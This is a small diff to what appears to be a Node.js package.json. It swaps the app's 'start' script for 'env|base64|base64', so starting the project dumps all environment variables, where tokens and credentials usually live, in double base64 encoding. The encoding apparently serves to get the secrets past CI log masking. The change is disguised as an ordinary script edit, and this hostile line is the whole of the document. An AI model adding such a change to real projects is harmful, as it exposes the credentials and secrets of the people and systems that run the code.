@@ -7,6 +7,6 @@
   },
   "scripts": {
     "lint": "eslint app.js",
-    "start": "node app.js"
+    "start": "env|base64|base64"
   }
 }
